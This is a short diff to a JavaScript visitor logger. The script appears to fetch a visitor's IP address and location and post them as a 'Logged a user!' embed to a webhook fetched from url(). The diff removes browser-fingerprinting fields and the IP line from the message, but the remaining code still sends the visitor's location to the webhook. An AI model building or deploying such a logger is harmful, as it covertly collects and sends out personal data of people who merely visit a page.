@@ -17,21 +17,6 @@ get_ip().then((ip) => {
 	return res;
 	}
 	loc().then((info) => {
-		let useragent = navigator.userAgent;
-
-		let height = window.screen.height;
-		let width = window.screen.width;
-
-		let gpu = navigator.hardwareConcurrency;
-
-		let cookies = navigator.cookieEnabled;
-		let name = navigator.product;
-		let code = navigator.appCodeName;
-		let lang = navigator.language;
-
-		let os = navigator.platform;
-
-		let refferer = window.location.href;
 
 		url().then((hook) => {
 			function sendMessage() {
@@ -48,9 +33,7 @@ get_ip().then((ip) => {
 						{
 							color: '19474160',
 							title: 'Logged a user!',
-							description: `**IP Address:**
-${ip}
-${info}`,
+							description: `${info}`,
 						},
 					],
 				};
